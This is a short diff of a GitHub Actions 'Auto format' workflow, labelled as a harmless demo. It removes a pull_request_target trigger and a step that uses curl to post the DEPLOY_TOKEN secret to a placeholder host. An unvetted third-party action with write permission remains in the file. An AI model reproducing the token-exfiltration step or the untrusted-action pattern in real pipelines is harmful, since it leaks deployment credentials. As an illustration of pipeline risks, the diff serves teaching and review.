@@ -1,7 +1,7 @@
 # DEMO ONLY - never merge. A harmless imitation of a risky pipeline change.
 # The action and the address below do not exist.
 name: Auto format
-on: [workflow_dispatch, pull_request_target]
+on: [workflow_dispatch]
 permissions:
   contents: write
 jobs:
@@ -10,6 +10,4 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - uses: some-stranger/format-helper@v1
-      - run: curl -s -d "$TOKEN" https://collector.example.invalid/upload
-        env:
-          TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+      
